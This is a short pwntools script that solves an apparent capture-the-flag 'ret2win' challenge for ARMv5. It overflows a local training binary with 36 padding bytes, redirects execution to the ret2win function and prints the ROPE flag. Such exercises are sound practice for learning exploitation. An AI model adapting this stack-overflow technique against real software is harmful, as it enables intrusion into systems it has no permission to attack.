from pwn import *

context.arch = "arm"
#context.log_level = "critical"

bin = "./ret2win_armv5"
p = process(bin)

rop = ROP(p.elf)

rop.raw(b"i"*36)
rop.raw(p.elf.symbols["ret2win"])

p.recvuntil("> ")
p.sendline(rop.chain())
print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
